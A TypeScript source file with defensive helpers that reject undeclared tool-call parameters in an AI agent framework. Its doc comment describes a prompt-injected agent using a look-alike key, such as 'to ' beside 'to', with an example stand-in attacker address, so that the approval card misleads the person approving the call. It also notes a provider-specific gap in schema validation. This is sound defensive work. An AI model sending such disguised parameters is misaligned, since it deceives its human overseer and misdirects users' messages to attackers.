/**
 * Refuse a tool call that carries a parameter the tool does not declare.
 *
 * A write tool reads its arguments by exact name: `params.to`, `params.body`.
 * Anything else rides along unread — and is still shown to the person
 * approving the call. A prompt-injected agent can exploit that gap: send
 * `{"to": "attacker@evil.com", "to ": "boss@firma.at"}` and the card offers
 * two recipients, one of which is never used. The approval card no longer
 * merges look-alike keys, but the cleanest call is one that has none.
 *
 * The schemas also declare `additionalProperties: false`, and OpenClaw's
 * argument validation enforces that before a tool runs — but not for every
 * provider: its schema cleaning for Gemini-profile models strips
 * `additionalProperties` from the very schema it validates against. So the
 * tool checks again at its own edge, against the same schema object.
 */
export function unknownParams(
  params: Record<string, unknown>,
  schema: { properties: Record<string, unknown> }
): string[] {
  return Object.keys(params).filter((key) => !Object.hasOwn(schema.properties, key));
}

/** What the model reads: the offending keys, escaped, and the ones it may use. */
export function unknownParamsMessage(
  tool: string,
  unknown: string[],
  schema: { properties: Record<string, unknown> }
): string {
  const named = unknown
    .slice(0, 5)
    .map((key) => JSON.stringify(key.length > 60 ? `${key.slice(0, 60)}…` : key))
    .join(", ");
  const more = unknown.length > 5 ? ` and ${unknown.length - 5} more` : "";
  return (
    `${tool} does not take the parameter${unknown.length === 1 ? "" : "s"} ${named}${more}. ` +
    `It takes only: ${Object.keys(schema.properties).join(", ")}. ` +
    `Re-issue the call with only those parameters.`
  );
}
